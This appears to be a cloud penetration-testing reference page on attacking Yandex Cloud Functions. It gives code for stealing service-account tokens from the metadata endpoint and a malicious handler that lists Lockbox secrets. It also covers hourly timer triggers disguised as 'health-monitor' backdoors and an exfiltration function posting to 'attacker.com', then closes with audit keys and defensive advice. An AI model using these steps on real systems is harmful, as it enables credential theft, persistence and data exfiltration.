# Cloud Functions (Serverless)

## Overview

Cloud Functions is the FaaS (Function-as-a-Service) offering. Functions execute with a bound service account's permissions, support multiple runtimes, and can be triggered by HTTP, timers, message queues, and more. The execution environment, environment variables, and SA binding are the primary attack surfaces.

## Credential Access

### Service Account Token via Metadata

From within a function's execution environment:

```python
import requests
r = requests.get(
    'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
    headers={'Metadata-Flavor': 'Google'}
)
token = r.json()['access_token']
```

### Environment Variable Extraction

```bash
# View function config including env vars
yc serverless function version get <version-id>
```

Environment variables commonly contain: API keys, database URLs, service credentials, Lockbox secret references.

---

## Privilege Escalation

### SA Binding Escalation

If you can deploy/update a function and bind a privileged service account:

```bash
yc serverless function version create \
  --function-id <func-id> \
  --runtime python312 \
  --entrypoint main.handler \
  --source-path ./code.zip \
  --service-account-id <privileged-sa-id>
```

The function code executes with that SA's full permissions.

### Code Injection

With `serverless.functions.editor`, deploy a new version with malicious code:

```python
def handler(event, context):
    import requests, os, json
    # Get SA token
    r = requests.get(
        'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
        headers={'Metadata-Flavor': 'Google'}
    )
    token = r.json()['access_token']
    # Use token to access cloud resources
    headers = {'Authorization': f'Bearer {token}'}
    secrets = requests.get(
        'https://lockbox.api.cloud.yandex.net/lockbox/v1/secrets',
        headers=headers
    )
    return {'statusCode': 200, 'body': secrets.text}
```

---

## Persistence

### Timer Trigger Backdoor

```bash
yc serverless trigger create timer \
  --name health-monitor \
  --cron-expression "0 * * * ? *" \
  --invoke-function-id <func-id> \
  --invoke-function-service-account-id <sa-id>
```

Executes every hour with the SA's permissions.

### Message Queue Trigger

```bash
yc serverless trigger create message-queue \
  --name queue-processor \
  --queue <queue-arn> \
  --invoke-function-id <func-id> \
  --invoke-function-service-account-id <sa-id>
```

Triggers on every message — useful for data interception.

---

## Exfiltration

Deploy a function that reads internal resources and POSTs to an external endpoint:

```python
def handler(event, context):
    import requests
    # Read from internal service using SA
    token = get_metadata_token()
    data = read_internal_resource(token)
    # Exfiltrate
    requests.post('https://attacker.com/exfil', json=data)
```

---

## Enumeration

```bash
yc serverless function list --folder-id <folder-id>
yc serverless function get <func-id>
yc serverless function version list --function-id <func-id>
yc serverless function version get <version-id>
yc serverless trigger list --folder-id <folder-id>
```

---

## Detection

| Event | Audit Key |
|---|---|
| Function version creation | `serverless.functions.createVersion` |
| Trigger creation | `serverless.triggers.create` |
| Function invocation | Function logs in Cloud Logging |

## Defensive Recommendations

1. Bind minimum-privilege SAs to functions
2. Store secrets in Lockbox, not environment variables
3. Monitor function version deployments
4. Restrict who can bind SAs to functions
5. Review trigger configurations regularly
